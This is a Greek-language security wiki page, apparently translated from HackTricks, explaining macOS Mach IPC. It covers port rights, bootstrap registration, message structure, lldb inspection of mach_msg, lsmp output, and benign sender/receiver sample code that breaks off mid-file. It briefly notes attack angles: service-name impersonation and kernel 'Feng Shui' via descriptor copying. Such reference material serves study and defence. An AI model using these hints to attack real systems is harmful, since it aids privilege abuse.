# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Το Mach χρησιμοποιεί **tasks** ως την **μικρότερη μονάδα** για την κοινή χρήση πόρων, και κάθε task μπορεί να περιέχει **πολλές νήματα**. Αυτές οι **tasks και νήματα αντιστοιχίζονται 1:1 σε POSIX processes και threads**.

Η επικοινωνία μεταξύ των tasks συμβαίνει μέσω της Mach Inter-Process Communication (IPC), χρησιμοποιώντας κανάλια επικοινωνίας ενός μόνο τρόπου. **Μηνύματα μεταφέρονται μεταξύ θυρών**, οι οποίες λειτουργούν ως **ουρές μηνυμάτων** που διαχειρίζεται ο πυρήνας.

Μια **θύρα** είναι το **βασικό** στοιχείο της Mach IPC. Μπορεί να χρησιμοποιηθεί για **να στείλει μηνύματα και να τα λάβει**.

Κάθε διαδικασία έχει έναν **πίνακα IPC**, όπου είναι δυνατή η εύρεση των **mach ports της διαδικασίας**. Το όνομα μιας mach port είναι στην πραγματικότητα ένας αριθμός (ένας δείκτης στο αντικείμενο του πυρήνα).

Μια διαδικασία μπορεί επίσης να στείλει ένα όνομα θύρας με ορισμένα δικαιώματα **σε μια διαφορετική task** και ο πυρήνας θα κάνει αυτή την καταχώρηση στον **πίνακα IPC της άλλης task** να εμφανιστεί.

### Port Rights

Τα δικαιώματα θύρας, τα οποία καθορίζουν ποιες λειτουργίες μπορεί να εκτελέσει μια task, είναι κλειδί για αυτή την επικοινωνία. Τα πιθανά **δικαιώματα θύρας** είναι ([ορισμοί από εδώ](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Δικαίωμα λήψης**, το οποίο επιτρέπει τη λήψη μηνυμάτων που αποστέλλονται στη θύρα. Οι Mach ports είναι MPSC (πολλοί παραγωγοί, ένας καταναλωτής) ουρές, που σημαίνει ότι μπορεί να υπάρχει μόνο **ένα δικαίωμα λήψης για κάθε θύρα** σε ολόκληρο το σύστημα (σε αντίθεση με τους σωλήνες, όπου πολλές διαδικασίες μπορούν να κατέχουν περιγραφές αρχείων στο αναγνωστικό άκρο ενός σωλήνα).
- Μια **task με το Δικαίωμα Λήψης** μπορεί να λαμβάνει μηνύματα και **να δημιουργεί Δικαιώματα Αποστολής**, επιτρέποντάς της να στέλνει μηνύματα. Αρχικά μόνο η **δική της task έχει Δικαίωμα Λήψης πάνω στη θύρα** της.
- Εάν ο ιδιοκτήτης του Δικαιώματος Λήψης **πεθάνει** ή το σκοτώσει, το **δικαίωμα αποστολής γίνεται άχρηστο (νεκρό όνομα).**
- **Δικαίωμα αποστολής**, το οποίο επιτρέπει την αποστολή μηνυμάτων στη θύρα.
- Το Δικαίωμα Αποστολής μπορεί να **αντιγραφεί** έτσι ώστε μια task που κατέχει ένα Δικαίωμα Αποστολής να μπορεί να το αντιγράψει και **να το παραχωρήσει σε μια τρίτη task**.
- Σημειώστε ότι τα **δικαιώματα θύρας** μπορούν επίσης να **περαστούν** μέσω μηνυμάτων Mac.
- **Δικαίωμα αποστολής-μία φορά**, το οποίο επιτρέπει την αποστολή ενός μηνύματος στη θύρα και στη συνέχεια εξαφανίζεται.
- Αυτό το δικαίωμα **δεν μπορεί** να **αντιγραφεί**, αλλά μπορεί να **μετακινηθεί**.
- **Δικαίωμα συνόλου θυρών**, το οποίο δηλώνει ένα _σύνολο θυρών_ αντί για μια μόνο θύρα. Η αποδέσμευση ενός μηνύματος από ένα σύνολο θυρών αποδεσμεύει ένα μήνυμα από μία από τις θύρες που περιέχει. Τα σύνολα θυρών μπορούν να χρησιμοποιηθούν για να ακούσουν σε πολλές θύρες ταυτόχρονα, πολύ όπως το `select`/`poll`/`epoll`/`kqueue` στο Unix.
- **Νεκρό όνομα**, το οποίο δεν είναι πραγματικό δικαίωμα θύρας, αλλά απλώς μια θέση κράτησης. Όταν μια θύρα καταστραφεί, όλα τα υπάρχοντα δικαιώματα θύρας στη θύρα μετατρέπονται σε νεκρά ονόματα.

**Οι tasks μπορούν να μεταφέρουν ΔΙΚΑΙΩΜΑΤΑ ΑΠΟΣΤΟΛΗΣ σε άλλους**, επιτρέποντάς τους να στέλνουν μηνύματα πίσω. **Τα ΔΙΚΑΙΩΜΑΤΑ ΑΠΟΣΤΟΛΗΣ μπορούν επίσης να αντιγραφούν, έτσι ώστε μια task να μπορεί να διπλασιάσει και να δώσει το δικαίωμα σε μια τρίτη task**. Αυτό, σε συνδυασμό με μια ενδιάμεση διαδικασία γνωστή ως **bootstrap server**, επιτρέπει αποτελεσματική επικοινωνία μεταξύ των tasks.

### File Ports

Οι θύρες αρχείων επιτρέπουν την ενσωμάτωση περιγραφών αρχείων σε Mach ports (χρησιμοποιώντας δικαιώματα Mach port). Είναι δυνατή η δημιουργία ενός `fileport` από μια δεδομένη FD χρησιμοποιώντας `fileport_makeport` και η δημιουργία μιας FD από μια fileport χρησιμοποιώντας `fileport_makefd`.

### Establishing a communication

Όπως αναφέρθηκε προηγουμένως, είναι δυνατή η αποστολή δικαιωμάτων χρησιμοποιώντας μηνύματα Mach, ωστόσο, **δεν μπορείτε να στείλετε ένα δικαίωμα χωρίς να έχετε ήδη ένα δικαίωμα** για να στείλετε ένα μήνυμα Mach. Έτσι, πώς καθορίζεται η πρώτη επικοινωνία;

Για αυτό, ο **bootstrap server** (**launchd** στο mac) εμπλέκεται, καθώς **ο καθένας μπορεί να αποκτήσει ένα ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ στον bootstrap server**, είναι δυνατή η αίτηση για ένα δικαίωμα να στείλει ένα μήνυμα σε μια άλλη διαδικασία:

1. Η task **A** δημιουργεί μια **νέα θύρα**, αποκτώντας το **ΔΙΚΑΙΩΜΑ ΛΗΨΗΣ** πάνω της.
2. Η task **A**, ως κάτοχος του Δικαιώματος Λήψης, **δημιουργεί ένα ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ για τη θύρα**.
3. Η task **A** καθορίζει μια **σύνδεση** με τον **bootstrap server**, και **του στέλνει το ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ** για τη θύρα που δημιούργησε στην αρχή.
- Θυμηθείτε ότι ο καθένας μπορεί να αποκτήσει ένα ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ στον bootstrap server.
4. Η task A στέλνει ένα μήνυμα `bootstrap_register` στον bootstrap server για **να συσχετίσει τη δεδομένη θύρα με ένα όνομα** όπως `com.apple.taska`
5. Η task **B** αλληλεπιδρά με τον **bootstrap server** για να εκτελέσει μια bootstrap **αναζήτηση για το όνομα υπηρεσίας** (`bootstrap_lookup`). Έτσι, ο bootstrap server μπορεί να απαντήσει, η task B θα του στείλει ένα **ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ σε μια θύρα που δημιούργησε προηγουμένως** μέσα στο μήνυμα αναζήτησης. Εάν η αναζήτηση είναι επιτυχής, ο **server διπλασιάζει το ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ** που έλαβε από την Task A και **το μεταδίδει στην Task B**.
- Θυμηθείτε ότι ο καθένας μπορεί να αποκτήσει ένα ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ στον bootstrap server.
6. Με αυτό το ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ, η **Task B** είναι ικανή να **στείλει** ένα **μήνυμα** **στην Task A**.
7. Για μια αμφίδρομη επικοινωνία, συνήθως η task **B** δημιουργεί μια νέα θύρα με ένα **ΔΙΚΑΙΩΜΑ ΛΗΨΗΣ** και ένα **ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ**, και δίνει το **ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ στην Task A** ώστε να μπορεί να στέλνει μηνύματα στην TASK B (αμφίδρομη επικοινωνία).

Ο bootstrap server **δεν μπορεί να πιστοποιήσει** το όνομα υπηρεσίας που διεκδικεί μια task. Αυτό σημαίνει ότι μια **task** θα μπορούσε δυνητικά να **παριστάνει οποιαδήποτε συστημική task**, όπως να διεκδικεί ψευδώς ένα όνομα υπηρεσίας εξουσιοδότησης και στη συνέχεια να εγκρίνει κάθε αίτημα.

Στη συνέχεια, η Apple αποθηκεύει τα **ονόματα υπηρεσιών που παρέχονται από το σύστημα** σε ασφαλή αρχεία ρυθμίσεων, που βρίσκονται σε **SIP-protected** καταλόγους: `/System/Library/LaunchDaemons` και `/System/Library/LaunchAgents`. Μαζί με κάθε όνομα υπηρεσίας, το **σχετικό δυαδικό αρχείο αποθηκεύεται επίσης**. Ο bootstrap server θα δημιουργήσει και θα διατηρήσει ένα **ΔΙΚΑΙΩΜΑ ΛΗΨΗΣ για καθένα από αυτά τα ονόματα υπηρεσίας**.

Για αυτές τις προκαθορισμένες υπηρεσίες, η **διαδικασία αναζήτησης διαφέρει ελαφρώς**. Όταν αναζητείται ένα όνομα υπηρεσίας, το launchd ξεκινά την υπηρεσία δυναμικά. Η νέα ροή εργασίας είναι ως εξής:

- Η task **B** ξεκινά μια bootstrap **αναζήτηση** για ένα όνομα υπηρεσίας.
- Ο **launchd** ελέγχει αν η task εκτελείται και αν δεν εκτελείται, **την ξεκινά**.
- Η task **A** (η υπηρεσία) εκτελεί μια **bootstrap check-in** (`bootstrap_check_in()`). Εδώ, ο **bootstrap** server δημιουργεί ένα ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ, το διατηρεί και **μεταφέρει το ΔΙΚΑΙΩΜΑ ΛΗΨΗΣ στην Task A**.
- Ο launchd διπλασιάζει το **ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ και το στέλνει στην Task B**.
- Η task **B** δημιουργεί μια νέα θύρα με ένα **ΔΙΚΑΙΩΜΑ ΛΗΨΗΣ** και ένα **ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ**, και δίνει το **ΔΙΚΑΙΩΜΑ ΑΠΟΣΤΟΛΗΣ στην Task A** (την svc) ώστε να μπορεί να στέλνει μηνύματα στην TASK B (αμφίδρομη επικοινωνία).

Ωστόσο, αυτή η διαδικασία ισχύει μόνο για προκαθορισμένες συστημικές tasks. Οι μη συστημικές tasks λειτουργούν όπως περιγράφηκε αρχικά, γεγονός που θα μπορούσε δυνητικά να επιτρέψει την παριστάνουν.

> [!CAUTION]
> Επομένως, ο launchd δεν πρέπει ποτέ να καταρρεύσει ή ολόκληρο το σύστημα θα καταρρεύσει.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Η συνάρτηση `mach_msg`, που είναι ουσιαστικά μια κλήση συστήματος, χρησιμοποιείται για την αποστολή και λήψη μηνυμάτων Mach. Η συνάρτηση απαιτεί το μήνυμα που θα σταλεί ως αρχικό επιχείρημα. Αυτό το μήνυμα πρέπει να ξεκινά με μια δομή `mach_msg_header_t`, ακολουθούμενη από το πραγματικό περιεχόμενο του μηνύματος. Η δομή ορίζεται ως εξής:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Διεργασίες που κατέχουν ένα _**δικαίωμα λήψης**_ μπορούν να λαμβάνουν μηνύματα σε μια Mach θύρα. Αντίθετα, οι **αποστολείς** έχουν ένα _**δικαίωμα αποστολής**_ ή ένα _**δικαίωμα αποστολής-μία φορά**_. Το δικαίωμα αποστολής-μία φορά προορίζεται αποκλειστικά για την αποστολή ενός μόνο μηνύματος, μετά το οποίο καθίσταται άκυρο.

Το αρχικό πεδίο **`msgh_bits`** είναι μια bitmap:

- Το πρώτο bit (το πιο σημαντικό) χρησιμοποιείται για να υποδείξει ότι ένα μήνυμα είναι σύνθετο (περισσότερα σχετικά με αυτό παρακάτω)
- Τα 3ο και 4ο χρησιμοποιούνται από τον πυρήνα
- Τα **5 λιγότερο σημαντικά bits του 2ου byte** μπορούν να χρησιμοποιηθούν για **voucher**: ένας άλλος τύπος θύρας για την αποστολή συνδυασμών κλειδιού/τιμής.
- Τα **5 λιγότερο σημαντικά bits του 3ου byte** μπορούν να χρησιμοποιηθούν για **τοπική θύρα**
- Τα **5 λιγότερο σημαντικά bits του 4ου byte** μπορούν να χρησιμοποιηθούν για **απομακρυσμένη θύρα**

Οι τύποι που μπορούν να καθοριστούν στο voucher, τις τοπικές και απομακρυσμένες θύρες είναι (από [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Για παράδειγμα, `MACH_MSG_TYPE_MAKE_SEND_ONCE` μπορεί να χρησιμοποιηθεί για να **υποδείξει** ότι ένα **send-once** **δικαίωμα** θα πρέπει να παραχθεί και να μεταφερθεί για αυτή την θύρα. Μπορεί επίσης να καθοριστεί `MACH_PORT_NULL` για να αποτραπεί ο παραλήπτης να μπορεί να απαντήσει.

Για να επιτευχθεί μια εύκολη **διπλής κατεύθυνσης επικοινωνία**, μια διαδικασία μπορεί να καθορίσει μια **mach port** στην κεφαλίδα **μήνυματος** που ονομάζεται _reply port_ (**`msgh_local_port`**) όπου ο **παραλήπτης** του μηνύματος μπορεί να **στείλει μια απάντηση** σε αυτό το μήνυμα.

> [!TIP]
> Σημειώστε ότι αυτός ο τύπος διπλής κατεύθυνσης επικοινωνίας χρησιμοποιείται σε μηνύματα XPC που αναμένουν μια απάντηση (`xpc_connection_send_message_with_reply` και `xpc_connection_send_message_with_reply_sync`). Αλλά **συνήθως δημιουργούνται διαφορετικές θύρες** όπως εξηγήθηκε προηγουμένως για να δημιουργηθεί η διπλής κατεύθυνσης επικοινωνία.

Τα άλλα πεδία της κεφαλίδας μηνύματος είναι:

- `msgh_size`: το μέγεθος ολόκληρου του πακέτου.
- `msgh_remote_port`: η θύρα στην οποία αποστέλλεται αυτό το μήνυμα.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: το ID αυτού του μηνύματος, το οποίο ερμηνεύεται από τον παραλήπτη.

> [!CAUTION]
> Σημειώστε ότι **τα mach μηνύματα αποστέλλονται μέσω μιας `mach port`**, η οποία είναι ένα **κανάλι επικοινωνίας με έναν μόνο παραλήπτη**, **πολλούς αποστολείς** που είναι ενσωματωμένο στον πυρήνα mach. **Πολλές διαδικασίες** μπορούν να **στείλουν μηνύματα** σε μια mach port, αλλά σε οποιαδήποτε στιγμή μόνο **μία διαδικασία μπορεί να διαβάσει** από αυτήν.

Τα μηνύματα σχηματίζονται από την κεφαλίδα **`mach_msg_header_t`** ακολουθούμενη από το **σώμα** και από το **trailer** (αν υπάρχει) και μπορεί να παραχωρήσει άδεια για να απαντηθεί. Σε αυτές τις περιπτώσεις, ο πυρήνας χρειάζεται απλώς να περάσει το μήνυμα από μια εργασία στην άλλη.

Ένα **trailer** είναι **πληροφορίες που προστίθενται στο μήνυμα από τον πυρήνα** (δεν μπορεί να οριστεί από τον χρήστη) οι οποίες μπορούν να ζητηθούν κατά την παραλαβή του μηνύματος με τις σημαίες `MACH_RCV_TRAILER_<trailer_opt>` (υπάρχουν διαφορετικές πληροφορίες που μπορούν να ζητηθούν).

#### Πολύπλοκα Μηνύματα

Ωστόσο, υπάρχουν και άλλα πιο **πολύπλοκα** μηνύματα, όπως αυτά που περνούν επιπλέον δικαιώματα θύρας ή μοιράζονται μνήμη, όπου ο πυρήνας χρειάζεται επίσης να στείλει αυτά τα αντικείμενα στον παραλήπτη. Σε αυτές τις περιπτώσεις, το πιο σημαντικό bit της κεφαλίδας `msgh_bits` είναι ρυθμισμένο.

Οι δυνατές περιγραφές που μπορούν να περαστούν ορίζονται στο [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
Σε 32bit, όλοι οι περιγραφείς είναι 12B και ο τύπος του περιγραφέα βρίσκεται στον 11ο. Σε 64bit, οι διαστάσεις ποικίλλουν.

> [!CAUTION]
> Ο πυρήνας θα αντιγράψει τους περιγραφείς από μια εργασία στην άλλη αλλά πρώτα **δημιουργώντας ένα αντίγραφο στη μνήμη του πυρήνα**. Αυτή η τεχνική, γνωστή ως "Feng Shui", έχει καταχραστεί σε πολλές εκμεταλλεύσεις για να κάνει τον **πυρήνα να αντιγράψει δεδομένα στη μνήμη του**, κάνοντάς τον διαδικασία να στείλει περιγραφείς στον εαυτό της. Στη συνέχεια, η διαδικασία μπορεί να λάβει τα μηνύματα (ο πυρήνας θα τα απελευθερώσει).
>
> Είναι επίσης δυνατό να **σταλεί δικαίωμα θύρας σε μια ευάλωτη διαδικασία**, και τα δικαιώματα θύρας θα εμφανιστούν απλώς στη διαδικασία (ακόμα κι αν δεν τα χειρίζεται).

### Mac Ports APIs

Σημειώστε ότι οι θύρες σχετίζονται με το namespace της εργασίας, οπότε για να δημιουργήσετε ή να αναζητήσετε μια θύρα, το namespace της εργασίας ερωτάται επίσης (περισσότερα στο `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Δημιουργία** μιας θύρας.
- `mach_port_allocate` μπορεί επίσης να δημιουργήσει ένα **σύνολο θυρών**: δικαίωμα λήψης πάνω από μια ομάδα θυρών. Όποτε λαμβάνεται ένα μήνυμα, υποδεικνύεται η θύρα από την οποία προήλθε.
- `mach_port_allocate_name`: Αλλάξτε το όνομα της θύρας (κατά προεπιλογή 32bit ακέραιος)
- `mach_port_names`: Λάβετε ονόματα θυρών από έναν στόχο
- `mach_port_type`: Λάβετε δικαιώματα μιας εργασίας πάνω σε ένα όνομα
- `mach_port_rename`: Μετονομάστε μια θύρα (όπως το dup2 για FDs)
- `mach_port_allocate`: Κατανείμετε μια νέα ΛΗΨΗ, PORT_SET ή DEAD_NAME
- `mach_port_insert_right`: Δημιουργήστε ένα νέο δικαίωμα σε μια θύρα όπου έχετε ΛΗΨΗ
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Λειτουργίες που χρησιμοποιούνται για **να στείλουν και να λάβουν mach μηνύματα**. Η έκδοση overwrite επιτρέπει να καθορίσετε ένα διαφορετικό buffer για τη λήψη μηνυμάτων (η άλλη έκδοση θα το επαναχρησιμοποιήσει απλώς).

### Debug mach_msg

Δεδομένου ότι οι λειτουργίες **`mach_msg`** και **`mach_msg_overwrite`** είναι αυτές που χρησιμοποιούνται για να στείλουν και να λάβουν μηνύματα, η ρύθμιση ενός breakpoint σε αυτές θα επιτρέψει την επιθεώρηση των αποσταλμένων και ληφθέντων μηνυμάτων.

Για παράδειγμα, ξεκινήστε την αποσφαλμάτωση οποιασδήποτε εφαρμογής μπορείτε να αποσφαλματώσετε καθώς θα φορτώσει **`libSystem.B` που θα χρησιμοποιήσει αυτή τη λειτουργία**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Για να λάβετε τα επιχειρήματα του **`mach_msg`**, ελέγξτε τους καταχωρητές. Αυτά είναι τα επιχειρήματα (από [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Λάβετε τις τιμές από τις μητρώες:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Επιθεωρήστε την κεφαλίδα του μηνύματος ελέγχοντας το πρώτο επιχείρημα:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Αυτός ο τύπος `mach_msg_bits_t` είναι πολύ κοινός για να επιτρέπει μια απάντηση.

### Καταμέτρηση θυρών
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Το **όνομα** είναι το προεπιλεγμένο όνομα που δίνεται στην θύρα (ελέγξτε πώς **αυξάνεται** στα πρώτα 3 bytes). Το **`ipc-object`** είναι ο **αποκρυπτογραφημένος** μοναδικός **ταυτοποιητής** της θύρας.\
Σημειώστε επίσης πώς οι θύρες με μόνο **`send`** δικαίωμα **αναγνωρίζουν τον κάτοχό** τους (όνομα θύρας + pid).\
Σημειώστε επίσης τη χρήση του **`+`** για να υποδείξετε **άλλες εργασίες που συνδέονται με την ίδια θύρα**.

Είναι επίσης δυνατό να χρησιμοποιήσετε [**procesxp**](https://www.newosxbook.com/tools/procexp.html) για να δείτε επίσης τα **καταχωρημένα ονόματα υπηρεσιών** (με το SIP απενεργοποιημένο λόγω της ανάγκης του `com.apple.system-task-port`):
```
procesp 1 ports
```
Μπορείτε να εγκαταστήσετε αυτό το εργαλείο σε iOS κατεβάζοντάς το από [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Παράδειγμα κώδικα

Σημειώστε πώς ο **αποστολέας** **κατανέμει** μια θύρα, δημιουργεί ένα **δικαίωμα αποστολής** για το όνομα `org.darlinghq.example` και το στέλνει στον **διακομιστή εκκίνησης** ενώ ο αποστολέας ζήτησε το **δικαίωμα αποστολής** αυτού του ονόματος και το χρησιμοποίησε για να **στείλει ένα μήνυμα**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
